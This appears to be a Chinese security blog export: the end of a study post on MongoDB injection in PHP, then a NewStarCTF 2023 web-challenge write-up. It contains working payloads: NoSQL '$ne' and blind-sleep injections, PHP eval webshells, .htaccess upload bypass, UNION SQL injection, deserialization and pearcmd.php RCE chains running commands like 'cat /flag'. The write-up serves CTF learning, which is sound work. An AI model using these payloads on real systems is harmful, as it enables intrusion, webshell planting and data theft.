主键,MongoDB自动将_id字段设置为主键 5.2 PHP操作MongoDB PHP下操作MongoDB大致分为两种方式，对应有不同的注入攻击方式。 5.2.1 使用MongoDB类中相应的方法 使用的Demo大致如下，此时传递进入的参数是一个数组： &lt;?php $mongo = new MongoClient(); $db = $mongo-&gt;myinfo; //选择数据库 $coll = $db-&gt;test; //选择集合 $coll-&gt;save(); //增 $coll-&gt;find(); //查 $coll-&gt;remove(); //减 $coll-&gt;update(); //改 ?&gt; 确保连接及选择一个数据库 为了确保正确连接，你需要指定数据库名，如果数据库在MongoDB中不存在，MongoDB会自动创建。 示例代码如下，访问页面会直接返回数据库名test： &lt;?php $m = new MongoClient(); // 连接默认主机和端口为：mongodb://localhost:27017 $db = $m-&gt;test; // 获取名称为 \"test\" 的数据库 echo $db; ?&gt; 1. 创建集合 创建集合的代码片段如下： &lt;?php $m = new MongoClient(); // 连接 $db = $m-&gt;test; // 获取名称为 \"test\" 的数据库 $collection = $db-&gt;createCollection(\"Mi1k\"); echo \"集合创建成功：\".$collection; ?&gt; 在数据库中确认确实创建成功： 2. 插入文档 在MongoDB中使用insert()方法插入文档，代码片段如下： &lt;?php $m = new MongoClient(); // 连接到mongodb $db = $m-&gt;test; // 选择一个数据库 $collection = $db-&gt;Mi1k; // 选择集合 $document = array( \"title\" =&gt; \"Hello\", \"description\" =&gt; \"Just a test.\", \"likes\" =&gt; 100, \"url\" =&gt; \"https://www.mi1k7ea.com/\", \"by\", \"mi1k7ea\" ); $collection-&gt;insert($document); echo \"数据插入成功\"; ?&gt; 插入成功后，到数据库中确认，这里pretty()方法以格式化的方式来显示所有文档。： 3. 查找文档 使用find()方法来读取集合中的文档，代码片段如下： &lt;?php $m = new MongoClient(); // 连接到mongodb $db = $m-&gt;test; // 选择一个数据库 $collection = $db-&gt;Mi1k; // 选择集合 $cursor = $collection-&gt;find(); // 迭代显示文档标题 foreach ($cursor as $document) { echo $document[\"title\"] . \" \"; } ?&gt; 访问即可看到查询的标题： 4. 更新文档 使用update()方法来更新文档，代码片段如下，将标题内容从Hello改为World： &lt;?php $m = new MongoClient(); // 连接到mongodb $db = $m-&gt;test; // 选择一个数据库 $collection = $db-&gt;Mi1k; // 选择集合 // 更新文档 $collection-&gt;update(array(\"title\"=&gt;\"Hello\"), array('$set'=&gt;array(\"title\"=&gt;\"World\"))); // 显示更新后的文档 $cursor = $collection-&gt;find(); // 循环显示文档标题 foreach ($cursor as $document) { echo $document[\"title\"] . \" \"; } ?&gt; 修改后显示改后的标题内容，客户端确认是修改了： 5. 删除文档 使用remove()方法来删除文档。 代码片段如下，将移除’title’为’World’的一条数据记录： &lt;?php $m = new MongoClient(); // 连接到mongodb $db = $m-&gt;test; // 选择一个数据库 $collection = $db-&gt;Mi1k; // 选择集合 // 移除文档 $collection-&gt;remove(array(\"title\"=&gt;\"World\"), array(\"justOne\" =&gt; true)); // 显示可用文档数据 $cursor = $collection-&gt;find(); foreach ($cursor as $document) { echo $document[\"title\"] . \" \"; } ?&gt; 访问之后，即删除了title为World的文档，在数据库中查不到Mi1k集合的文档内容了。 5.2.2 使用execute()函数执行字符串 使用的Demo大致如下，此时传进方法execute()的参数就是字符串变量$query（特别的，此时的字符串书写语法为JS的书写语法）： &lt;?php $mongo = new mongoclient(); $db = $mongo-&gt;myinfo; //选择数据库 $query = \"db.table.save({'newsid':1})\"; //增 $query = \"db.table.find({'newsid':1})\"; //查 $query = \"db.table.remove({'newsid':1})\"; //减 $query = \"db.table.update({'newsid':1},{'newsid',2})\"; 改 $result = $db-&gt;execute($query); ?&gt; 5.3 PHP MongoDB注入攻击 不同编程语言环境下的MongoDB注入情景没啥差别，这里主要对PHP中实现的MongoDB进行详细分析，理解原理和场景就OK，其他语言就大致给Demo就好。 在此之前，我们需要先初始化数据库、赋给一些用户数据用于后面的Demo使用，这里随机添加10个用户，最后一个test用户为公共用户、大家都知道的： &lt;?php $m = new MongoClient(); // 连接到mongodb $db = $m-&gt;test; // 选择一个数据库 $collection = $db-&gt;test; // 选择集合 $ori = '0123456789abcdefghijklmnopqrstuvwsyz'; for ($i=0; $i &lt; 10; $i++) { $str = ''; for ($j=0; $j &lt; 10; $j++) { $str .= $ori[rand(0, strlen($ori)-1)]; } $data = array( 'userid'=&gt;$i, 'username'=&gt;'user'.$i, 'password'=&gt;$str ); $collection-&gt;insert($data); } echo '添加成功&lt;br&gt;'; $data = array( 'userid'=&gt;10, 'username'=&gt;'test', 'password'=&gt;'test' ); $collection-&gt;insert($data); echo '用户test添加成功'; ?&gt; 访问触发一遍即可创建成功： 5.3.1 PHP数组注入/重言式注入 一个数组绑定的查询代码如下： &lt;?php $mongo = new MongoClient(); // 连接到mongodb $db = $mongo-&gt;test; //选择数据库 $coll = $db-&gt;test; //选择集合 $username = $_GET['username']; $password = $_GET['password']; $data = array( 'username'=&gt;$username, 'password'=&gt;$password ); $data = $coll-&gt;find($data); $count = $data-&gt;count(); if ($count&gt;0) { foreach ($data as $user) { echo 'username:'.$user['username'].\"&lt;/br&gt;\"; echo 'password:'.$user['password'].\"&lt;/br&gt;\"; } } else{ echo '未找到'; } ?&gt; 当我们用公共用户test输入时，显示出username和password： 分析一下，这里我输入的是?username=test&amp;password=test，然后进入到MongoDB中的语句其实为db.test.find({username:'test',password:'test'});。 若此时我们以PHP数组的形式输入?username[a]=test&amp;password=test，源码中$data的值便为： $data = array( 'username'=&gt;array('a'=&gt;'test'), 'password'=&gt;'test' ); 最后实际MongoDB执行的语句为db.test.find({username:{a:'test'},password:'test'});。 因此，我们就可以利用这个特性往数组的键名传递一个操作符（大于，小于，等于，不等于等等），从而达到利用的目的： ?username[$ne]=1&amp;password[$ne]=1 $ne即not equal不等于，转换到MongoDB语句即为： db.test.find({username:{'$ne':'1'},password:{'$ne':'1'}}); 而该语句相当于： select * from test where username!='1' and password!='1'; 直接爆出了所有数据库用户信息： 5.3.2 execute()执行拼接字符串导致的注入/联合查询注入 代码如下，为了方便查看注入的语句，我这里添加了输出查询语句： &lt;?php $username = $_GET['username']; $password = $_GET['password']; $query = \"var data = db.test.findOne({username:'$username',password:'$password'});return data;\"; echo $query.'&lt;br&gt;'; $mongo = new MongoClient(); $db = $mongo-&gt;test; $data = $db-&gt;execute($query); if ($data['ok'] == 1) { if ($data['retval']!=NULL) { echo 'username:'.$data['retval']['username'].\"&lt;/br&gt;\"; echo 'password:'.$data['retval']['password'].\"&lt;/br&gt;\"; }else{ echo '未找到'; } }else{ echo $data['errmsg']; } ?&gt; 可以看到，是直接拼接起来的字符串然后传入execute()函数中执行。 正常访问： 添加个单引号试试，发现会报错： 此时可以利用注释或闭合的方法针对性地实现注入就可以了。 利用注释 按照输出的提示语句以及报错信息逐个尝试，目的是成功注释掉后面的password部分语句并返回成功，当输入如下payload时成功返回： ?username=test'});return true;})//&amp;password=test 这里返回username和password两项，按照MongoDB数据的Json格式，我们可以让其返回Json键值对看看： 没问题，剩下的就是各种payload尝试了。 爆数据库版本： ?username=test'});return {username:db.version(),password:1};})//&amp;password=test 爆当前数据库所有集合，这里因为db.getCollectionNames()返回的是数组、需要用tojson()转换为字符串，另外MongoDB函数区分大小写： ?username=test'});return {username:tojson(db.getCollectionNames()),password:1};})//&amp;password=test 爆其他集合第一条数据，我这里本地新建user集合并插入文档，若想继续遍历爆其他信息只需修改数组下标即可： ?username=test'});return {username:tojson(db.user.find()[0]),password:1};})//&amp;password=test 往user集合插入新用户数据： ?username=test'});return {username:db.user.insert({'username':'mi1k7ea','password':'mi1k7ea'}),password:1};})//&amp;password=test 利用闭合 构造如下payload，用于闭合后面的语句使语法正确： ?username=test'});return {username:db.version(),password:1};var b=({a:'1&amp;password=test 剩下的其他利用和前面的一样，这里只说个重点的，在无回显的情况下，我们就需要用到盲注技巧，这里用到的盲注是基于时间的盲注，在高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注（这种盲注技巧仅在闭合的情况下可行，本人在注释的情况下并未成功）： ?username=test'});if (db.version()&gt;\"0\"){sleep(10000);exit;}var b=({a:'1&amp;password=test 若数据库版本大于0，则sleep 10s： 剩下的就是进阶的了，可参考下面的 0x06 总结 emmm本次文章呢，旨在初步了解各种常用数据库的常规注入语句，进阶的内容的很少（但我心里认为还是有必要深度学习一下的）不过我感觉学好MySQL的话也是很有帮助的，剩下的可以遇到的时候百度什么的。 本文呢也只是简单总结一下，copy rate is 99.9999999999…%（我也不想啊，太菜了，遇到不会的知识，以目前的我根本没能力写出高质量的文章（也就是用自己的语言以及思考去写），只得抄袭众多大佬的，但希望这些知识可以变成自己的，不论如何我都会努力提升自己，在日后提升文章质量（毕竟只有这样，我认为才学的深刻吧），本文也会一直更新（难免实战遇到来更新一下）。 加油！！ 0x07 参考文章 mssql参考 MSSQL 注入与提权方法整理 Mysql 隐式类型转换 MSSQL 注入学习笔记 MSSQL注入环境搭建 渗透测试之基础篇：Microsoft SQL Server手注之联合查询注入 --靶场实战参考 postgresql参考 postgresql注入 [PostgreSQL] Oracle参考 Oracle SQL注入学习 --含提权 关于学习Oracle注入 [Oracle注入] 从零开始的Oracle注入学习 【实战】Oracle注入总结 MongoDB参考 NoSQL注入之MongoDB MongoDB注入 MongoDB 注入指北 丨 http://drops.wooyun.org/tips/3939","categories":["常见top漏洞"]},{"title":"NewStarCTF 2023","path":"/2023/10/12/newstarctf-2023/","content":"0x01 前言 最近新生赛很多，我很爱，以为可以顺利度过四周，把CTF题座烂，没想到在SHCTF的第二周就ji了（目前为止，┭┮﹏┭┮有两道题不会，还是太菜了唉，于是转战newstar，希望不要打击我了。话不多说直接开卷 WEEK1|WEB-泄漏的秘密 ![image-20231111201723769](NewStarCTF 2023/image-20231111201723769.png) 拿到第一个，访问www.zip拿到第二个 ![image-20231111201826309](NewStarCTF 2023/image-20231111201826309.png) WEEK1|WEB-Begin of Upload 右键源代码发现如下： function validateForm() { var fileInput = document.getElementById(\"file\"); var file = fileInput.files[0]; var allowedExtensions = [\"jpg\", \"jpeg\", \"png\", \"gif\"]; var fileExtension = file.name.split('.').pop().toLowerCase(); if (!file) { alert(\"Please select a file to upload.\"); return false; } if (!allowedExtensions.includes(fileExtension)) { alert(\"错误的拓展名，只允许上传: JPG, JPEG, PNG, GIF\"); return false; } return true; } 发现只是前端的验证，那我们先对某个文件写入一句话木马，接着修改后缀为上述js允许的，上传后bp抓包修改后缀即可 ![image-20231111202150535](NewStarCTF 2023/image-20231111202150535.png) ![image-20231111202218089](NewStarCTF 2023/image-20231111202218089.png) 拿到flag WEEK1|WEB-Begin of HTTP ![image-20231111202453595](NewStarCTF 2023/image-20231111202453595.png) 完整payload如上，其中secret查看源代码即可得到 WEEK1|WEB-ErrorFlask flask报错页面信息泄露 ![image-20231111203220248](NewStarCTF 2023/image-20231111203220248.png) 这里让我们给number1和number2传参，这里随便给其中一个传个字母，发现到了下面的报错页面，即可得到flag ![image-20231111203032827](NewStarCTF 2023/image-20231111203032827.png) WEEK1|WEB-Begin of PHP &lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_GET['key1']) &amp;&amp; isset($_GET['key2'])){ echo \"=Level 1=&lt;br&gt;\"; if($_GET['key1'] !== $_GET['key2'] &amp;&amp; md5($_GET['key1']) == md5($_GET['key2'])){ $flag1 = True; }else{ die(\"nope,this is level 1\"); } } if($flag1){ echo \"=Level 2=&lt;br&gt;\"; if(isset($_POST['key3'])){ if(md5($_POST['key3']) === sha1($_POST['key3'])){ $flag2 = True; } }else{ die(\"nope,this is level 2\"); } } if($flag2){ echo \"=Level 3=&lt;br&gt;\"; if(isset($_GET['key4'])){ if(strcmp($_GET['key4'],file_get_contents(\"/flag\")) == 0){ $flag3 = True; }else{ die(\"nope,this is level 3\"); } } } if($flag3){ echo \"=Level 4=&lt;br&gt;\"; if(isset($_GET['key5'])){ if(!is_numeric($_GET['key5']) &amp;&amp; $_GET['key5'] &gt; 2023){ $flag4 = True; }else{ die(\"nope,this is level 4\"); } } } if($flag4){ echo \"=Level 5=&lt;br&gt;\"; extract($_POST); foreach($_POST as $var){ if(preg_match(\"/[a-zA-Z0-9]/\",$var)){ die(\"nope,this is level 5\"); } } if($flag5){ echo file_get_contents(\"/flag\"); }else{ die(\"nope,this is level 5\"); } } 简单的PHP特性 ![image-20231111204241044](NewStarCTF 2023/image-20231111204241044.png) 拿到flag WEEK1|WEB-R!C!E! &lt;?php highlight_file(__FILE__); if(isset($_POST['password'])&amp;&amp;isset($_POST['e_v.a.l'])){ $password=md5($_POST['password']); $code=$_POST['e_v.a.l']; if(substr($password,0,6)===\"c4d038\"){ if(!preg_match(\"/flag|system|pass|cat|ls/i\",$code)){ eval($code); } } } 这里需要走个脚本爆破一下 import hashlib a=input(\"请输入您要爆破的md5:\") for i in range(1,200000000): x=hashlib.md5(str(i).encode(encoding='UTF-8')).hexdigest() if (x[0:6]==a): print(x) print(i) break 得到114514 ![image-20231111204631008](NewStarCTF 2023/image-20231111204631008.png) 如图成功的到phpinfo，接下来就是读取了 可以看到是禁止了 system 函数，可以采用 php 自带的函数来达到一样的效果，先使用 scandir 看一下目录，注意 scandir 是不会回显输出的，记得加上 var_dump。 ![image-20231111204728698](NewStarCTF 2023/image-20231111204728698.png) 发现flag password=114514&amp;e[v.a.l=var_dump(file_get_contents($_POST['a']));&amp;a=/flag ![image-20231111204936443](NewStarCTF 2023/image-20231111204936443.png) 拿到flag WEEK1|WEB-EasyLogin 进入之后是一个登录界面，先随便注册一个账号登进去看看。 Ctrl``C和Ctrl``D回到 Shell，简单看了下目录结构没有什么东西 只告知了含有一个 admin 用户，按方向上键可以查询Bash历史记录。 ![image-20231111205334676](NewStarCTF 2023/image-20231111205334676.png) 发现 Hint，得知 admin 的密码为弱密码加上newstarnewstar2023后其中的一个。 按CtrlD或者输入exit后回车回到登录界面。 试一下newstar``newstar2023，没登进去，在网上随便搜弱密码，试一些常见的，试出来是qwe123，不同的靶机密码可能不一样。 题目采用的弱密码表： 123456789 password newstar newstar2023 123qwe qwe123 qwertyuiop asdfghjkl zxcvbnm admin123 admin888 111111 000000 ![image-20231111205827255](NewStarCTF 2023/image-20231111205827255.png) 这里我000000登录进去，查看bash历史命令发现让我们使用hint ![image-20231111210045998](NewStarCTF 2023/image-20231111210045998.png) 重新登录后抓包，查看http历史记录发现上图，拿到flag WEEK2|WEB-游戏高手 ![image-20231012214719990](NewStarCTF 2023/image-20231012214719990.png) 打开界面这跟SHCTF的某个一样啊，不过似乎更复杂一点？我们直接F12审计js。 这里看到flag有分数限制，那我们去就js找找关键词，东找西找发现一处可疑代码 ![image-20231012215035948](NewStarCTF 2023/image-20231012215035948.png) 这里显示这分数达标的处理方法，我们看到这似乎是需要bp抓包修改发包方式的，嗯我们直接开搞 ![image-20231012220006711](NewStarCTF 2023/image-20231012220006711.png) 这里依据代码修改为 POST传参方式，更改url路径，添加content-type的数据解析格式，然后添加正确的json数据格式即可得到flag WEEK2|WEB-include 0。0 &lt;?php highlight_file(__FILE__); // FLAG in the flag.php $file = $_GET['file']; if(isset($file) &amp;&amp; !preg_match('/base|rot/i',$file)){ @include($file); }else{ die(\"nope\"); } ?&gt; nope 简单的文件包含题目，这里也就是看如何绕过正则的问题，这就要搬出小笔记了 convert转换过滤器 常见的convert转换过滤器有这两种： convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; convert.quoted-printable-encode 对于第一种来说，它通过 PHP 的 iconv 扩展实现，该扩展可以帮助将输入数据从指定的字符编码（）转换为另一个字符编码（） 其中input-encoding、output-encoding支持的编码格式为： UCS-4* UCS-4BE UCS-4LE* UCS-2 UCS-2BE UCS-2LE UTF-32* UTF-32BE* UTF-32LE* UTF-16* UTF-16BE* UTF-16LE* UTF-7 UTF7-IMAP UTF-8* ASCII* EUC-JP* SJIS* eucJP-win* SJIS-win* ISO-2022-JP ISO-2022-JP-MS CP932 CP51932 SJIS-mac（别名：MacJapanese） SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO） SJIS-Mobile#KDDI（别名：SJIS-KDDI） SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK） UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO） UTF-8-Mobile#KDDI-A UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI） UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK） ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI） JIS JIS-ms CP50220 CP50220raw CP50221 CP50222 ISO-8859-1* ISO-8859-2* ISO-8859-3* ISO-8859-4* ISO-8859-5* ISO-8859-6* ISO-8859-7* ISO-8859-8* ISO-8859-9* ISO-8859-10* ISO-8859-13* ISO-8859-14* ISO-8859-15* ISO-8859-16* byte2be byte2le byte4be byte4le BASE64 HTML-ENTITIES（别名：HTML） 7bit 8bit EUC-CN* CP936 GB18030 HZ EUC-TW* CP950 BIG-5* EUC-KR* UHC（别名：CP949） ISO-2022-KR Windows-1251（别名：CP1251） Windows-1252（别名：CP1252） CP866（别名：IBM866） KOI8-R* KOI8-U* ArmSCII-8（别名：ArmSCII8） 本题payload如下： ?filename=php://filter/convert.iconv.UTF-8.UTF-16/resource=check.php 这里也就是更换正确的转换器就可以绕过了，毕竟他过滤的很少，就两个关键词，这里大家也可以放入字典爆破看看那些能用，我这里就是直接选择了某个尝试的 ![image-20231012220434736](NewStarCTF 2023/image-20231012220434736.png) 成功读取flag WEEK2|WEB-ez_sql 方法一：sqlmap一把梭 ![image-20231014143835755](NewStarCTF 2023/image-20231014143835755.png) 打开界面如下，事后诸葛亮来说这些连接都可以进行sql注入，这里也是第二次解的时候才解出来，第一次进行常规注入发现没啥用，于是第二次的话选择sqlmap直接一把梭，演示如下 首先我们先判断该网址是否存在sql注入 sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" ![image-20231014144323672](NewStarCTF 2023/image-20231014144323672.png) 如上图可知数据库类型为mysql并且可以看到版本也爆了出来。这说明存在sql注入，接下来直接选择爆数据库（语法可自行百度） sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --dbs ![image-20231014144535359](NewStarCTF 2023/image-20231014144535359.png) 可以看出可以数据库为ctf，接下来爆表名 sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --tables -D ctf ![image-20231014144657573](NewStarCTF 2023/image-20231014144657573.png) 可以看到flag所在表名，接下来爆列名 sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --columns -D ctf -T here_is_flag ![image-20231014144810841](NewStarCTF 2023/image-20231014144810841.png) 接下来是爆数据 sqlmap -u \"http://24125a8f-3b9c-493e-aa34-ed1d321ede57.node4.buuoj.cn:81/?id=TMP0919\" --dump -D ctf -T here_is_flag ![image-20231014144854248](NewStarCTF 2023/image-20231014144854248.png) 拿到flag 方法二：手工注入 我始终认为应该是手工为主，工具为辅，因此我又接着尝试一下手工，首先我们正常判断一下是否存在sql注入 ![image-20231014144956525](NewStarCTF 2023/image-20231014144956525.png) 这里测试了几次发现都是一个no的提示，想了想我认为这应该是被过滤了，然后无意间看到sqlmap的payload尝试的有大写，于是我也改成了大写 ![image-20231014145139951](NewStarCTF 2023/image-20231014145139951.png) ![image-20231014145205187](NewStarCTF 2023/image-20231014145205187.png) 可以看到我将and换为了大写之后发现页面是一个报错，一个正常，说明存在sql注入，接着继续常规思路。 查字段数 ?id=TMP0919' ORDER BY 5--+ //页面正常 ?id=TMP0919' ORDER BY 6--+ //页面报错 ![image-20231014145359706](NewStarCTF 2023/image-20231014145359706.png) ![image-20231014145408933](NewStarCTF 2023/image-20231014145408933.png) 说明当前表字段数为5 接着查回显位 ?id=-TMP0919' UNION SELECT 1, 2, 3, 4, 5--+ //这里id值前面加了个负号的原因是，防止id那一块儿占用回显位 ![image-20231014145435492](NewStarCTF 2023/image-20231014145435492.png) 如上图可以看到5个字段都可以回显，那我们直接爆库 ![image-20231014145548447](NewStarCTF 2023/image-20231014145548447.png) 接着查看ctf下的表名 ?id=-TMP0919' UNION SELECT 1, GROUP_CONCAT(TABLE_NAME), 3, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ctf'--+ ![image-20231014150008934](NewStarCTF 2023/image-20231014150008934.png) 接着爆出here_is_flag下列名 ?id=-TMP0919' UNION SELECT 1, GROUP_CONCAT(COLUMN_NAME), 3, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='ctf'--+ ![image-20231014150207165](NewStarCTF 2023/image-20231014150207165.png) 接着爆出flag列下的数据 ?id=-TMP0919' UNION SELECT 1, FLAG, 3, 4, 5 FROM here_is_flag--+ ![image-20231014150308760](NewStarCTF 2023/image-20231014150308760.png) 拿到flag WEEK2|WEB-Unserialize？ &lt;?php highlight_file(__FILE__); // Maybe you need learn some knowledge about deserialize? class evil { private $cmd; public function __destruct() { if(!preg_match(\"/cat|tac|more|tail|base/i\", $this-&gt;cmd)){ @system($this-&gt;cmd); } } } @unserialize($_POST['unser']); ?&gt; 简单的反序列化，直接将unser赋值为evil对象，在对象生命周期结束的时候会自动调用destruct这个析构函数随后会执行system，这里只需要绕过一下命令即可，poc如下 &lt;?php class evil { public $cmd; } $poc = new evil(); $poc-&gt;cmd = 'ls /'; echo serialize($poc); ?&gt; 这里可以先看一下网站php版本在7.1以上，这个版本以上对类属性不敏感，我们直接将private改为public即可 ![image-20231014151027275](NewStarCTF 2023/image-20231014151027275.png) ![image-20231014151117793](NewStarCTF 2023/image-20231014151117793.png) 找到flag，接下来在修改poc如下，这里过滤补全我们采用nl读取即可 &lt;?php class evil { public $cmd; } $poc = new evil(); $poc-&gt;cmd = 'nl /th1s_1s_fffflllll4444aaaggggg'; echo serialize($poc); ?&gt; ![image-20231014151222819](NewStarCTF 2023/image-20231014151222819.png) 拿到flag WEEK2|WEB-Upload again! ![image-20231014151320133](NewStarCTF 2023/image-20231014151320133.png) emmm很难评的页面。。。。，话不多说我们直接传一下php看看 ![image-20231014151500441](NewStarCTF 2023/image-20231014151500441.png) 哟呵，直接上bp，现将后缀改为jpg上传抓包看看 ![image-20231014151659479](NewStarCTF 2023/image-20231014151659479.png) 嗯，猜测这里过滤了文件名并且还检测了文件头 随后尝试过添加GIF头无果，于是尝试上传.htaccess文件，发现可以上传 ![image-20231014152301398](NewStarCTF 2023/image-20231014152301398.png) 如上图，红色字体意思是将别的后缀名文件内容解析为php程序 AddType application/x-httpd-php .gif 随后看到成功上传，那我们直接上传flag.gif看看，不过在第一次上传的时候得将php标签转换一下，毕竟此网站过滤了php标签，如下payload &lt;script language=\"php\"&gt;eval($_POST[sb]);&lt;/script&gt; ![image-20231014152954676](NewStarCTF 2023/image-20231014152954676.png) 发现成功上传 我们直接访问看看 ![image-20231014153137082](NewStarCTF 2023/image-20231014153137082.png) 成功上传，尝试蚁剑连接 ![image-20231014153245515](NewStarCTF 2023/image-20231014153245515.png) ![image-20231014153252173](NewStarCTF 2023/image-20231014153252173.png) 找到flag WEEK2|WEB-R!!C!!E!! 这题老懵逼了，当时扫目录总是429错误（说是访问速度过快）于是我以为不能扫目录，搞得我解不出来，看了wp发现竟然能扫？？？我服了啊，于是我又赶紧启动去扫了一下。。。依旧是429我胡了 无奈只能直接上githack工具看看，果然还是搞到了 ![image-20231015223844532](NewStarCTF 2023/image-20231015223844532.png)\t查看boog1pop.php &lt;?php highlight_file(__FILE__); if (';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['star'])) { if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])) { eval($_GET['star']); } } 第一个正则对提交的参数进行处理：任意字符加上可选的括号（允许嵌套）更换为空，然后判断是否等于分号，结合下面的 eval 可以知道就是无参数命令执行。 第二个正则过滤了一些常用的用于无参数命令执行的 php 方法，但过滤不全，可以使用类似功能的方法进行绕过，最终命令执行。 这里也是第一次遇见PHP无参数RCE，浅浅了解一下 &lt;?php # @Author: h1xa highlight_file(__FILE__); if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']); } ?&gt; ​ 一般来说当我们可以控制或自己上传一个木马后，就可以进行任意命令执行，但像上面这样/[^\\W]+\\((?R)?\\)/的正则过滤方式，我们不能输入任何参数，这样想绕过的话一个大的思路就是通过套娃，通过让一个函数的返回值作为另一个函数的参数，也就是这样a(b(c()));，最终达到rce的效果，下面列几种绕过方法，这里就不赘述了，之后搞一个专门的文章去记录一下，这里直接搬出答案了 这里是GPT对上述正则的解析 上述正则表达式是 `/[^\\W]+\\((?R)?\\)/`，让我们一步一步解释它： 1. `/`：正则表达式的起始标记。 2. `[^\\W]+`：这是一个字符类，表示匹配一个或多个非字母非数字的字符。`[^\\W]` 是 `\\w` 的否定，`\\w` 包括字母、数字和下划线，因此 `[^\\W]` 匹配除字母、数字和下划线之外的任何字符。`+` 表示匹配一个或多个这样的字符。 3. `\\(`：匹配左括号 `(` 字符。括号通常用于函数调用或分组。 4. `(?R)?`：这是一个递归子模式，`?` 表示其前面的子模式（`(?R)`）是可选的。这意味着它可以零次或多次重复整个模式。 5. `\\)`：匹配右括号 `)` 字符。 综合来看，这个正则表达式的目的是匹配一个或多个非字母非数字字符，然后紧接着一个左括号，之后是可选的递归子模式，最后是右括号。这看起来是一种试图匹配函数调用的模式，但它使用递归子模式的方式可能并不是最好的方式来处理函数嵌套。 ![image-20231015225038371](NewStarCTF 2023/image-20231015225038371.png) 传入上述payload拿到flag ?star=eval(pos(array_reverse(getallheaders()))); X-Forwarder-Proto: system('cat /f*'); WEEK3|WEB-Include 🍐 &lt;?php error_reporting(0); if(isset($_GET['file'])) { $file = $_GET['file']; if(preg_match('/flag|log|session|filter|input|data/i', $file)) { die('hacker!'); } include($file.\".php\"); # Something in phpinfo.php! } else { highlight_file(__FILE__); } ?&gt; 看到代码之后感觉似曾相识，但却忘记了，不过这里提示我们看一下phpinfo.php页面，那我们就看看 ![image-20231021161355406](NewStarCTF 2023/image-20231021161355406.png) 浏览一波发现这里的flag虽然是错的，但却也是一个hint，他提示让我们检查一下register_argc_argv这个变量， ![image-20231021161441682](NewStarCTF 2023/image-20231021161441682.png) 如上图我们看到这个变量是开启的状态，那应该就可以猜到这里有漏洞可以利用，但毕竟我也是菜鸡没学过，那这时候就需要强大的搜索引擎了，google搜索关键词：文件包含漏洞 register_argc_argv=on；我们就可以看到有很多漏洞复现的文章，我们挑一个比较好的复现即可 ![image-20231021161617671](NewStarCTF 2023/image-20231021161617671.png) 这里呢我就先复现一波，至于原理就另起文章去学习吧。 首先这个漏洞叫做pearcmd.php漏洞 要利用这个pearcmd.php需要满足几个条件： （1）.要开启register_argc_argv这个选项在Docker中是自动开启的 （2）.要有文件包含的利用 ![image-20231021161911834](NewStarCTF 2023/image-20231021161911834.png) 这里借用现成的图片截图了 看到config-create，去阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。 所以最后构造出payload： /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php 上面是将写到/tmp/hello.php,然后我们再使用文件包含进行包含我们之前写入的文件（hello.php）就可以了。 而对于此题我们需要构造如下payload： /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?php @eval($_POST[1]);?&gt;+/tmp/hello.php 这里呢直接用bp传入，用hackbar传入的话会被url编码，导致传入文件无法解析 ![image-20231021163148135](NewStarCTF 2023/image-20231021163148135.png) 但这里的index.php也是可以去掉的 ![image-20231021174341649](NewStarCTF 2023/image-20231021174341649.png) 如上图，这代表文件上传成功，接下来我们访问后台文件，我们利用文件包含漏洞读取 ![image-20231021174637310](NewStarCTF 2023/image-20231021174637310.png) 如上图代表上传成功，接下来可以蚁剑连接或者直接手动读取，这里我就直接上了：1=system('cat /flag'); ![image-20231021174758295](NewStarCTF 2023/image-20231021174758295.png) 拿到flag WEEK3|WEB-POP Gadget &lt;?php highlight_file(__FILE__); class Begin{ public $name; public function __destruct() { if(preg_match(\"/[a-zA-Z0-9]/\",$this-&gt;name)){ echo \"Hello\"; }else{ echo \"Welcome to NewStarCTF 2023!\"; } } } class Then{ private $func; public function __toString() { ($this-&gt;func)(); return \"Good Job!\"; } } class Handle{ protected $obj; public function __call($func, $vars) { $this-&gt;obj-&gt;end(); } } class Super{ protected $obj; public function __invoke() { $this-&gt;obj-&gt;getStr(); } public function end() { die(\"==GAME OVER==\"); } } class CTF{ public $handle; public function end() { unset($this-&gt;handle-&gt;log); } } class WhiteGod{ public $func; public $var; public function __unset($var) { ($this-&gt;func)($this-&gt;var); } } @unserialize($_POST['pop']); 简单的反序列化，我们依旧老思路，看敏感函数，浏览一下可以清晰看到whiteGod类中有一处($this-&gt;func)($this-&gt;var);，这里很明显就是可以让我们自定义函数的漏洞点，接下来我们看其所在unset方法。想一下如何调用即可 __unset()，当对不可访问属性调用unset()时，__unset()会被调用 也就是说我们要想办法在unset函数的参数中，访问一个不可访问的属性（也就是不存在的）随后我们再浏览一下看到这里unset($this-&gt;handle-&gt;log);很明显这就是我们要的点，那我们在分析如何调用其所在的end函数。 再次浏览会发现Handle类中的call方法其中会调用end函数，那我们再找如何调用call魔术方法 __call()，在对象中调用一个不可访问方法时调用 根据上述条件我们可以发现在Super类中有一处$this-&gt;obj-&gt;getStr();，很明显就是我们要的，接下来我们在看如何调用其所在invoke魔术方法 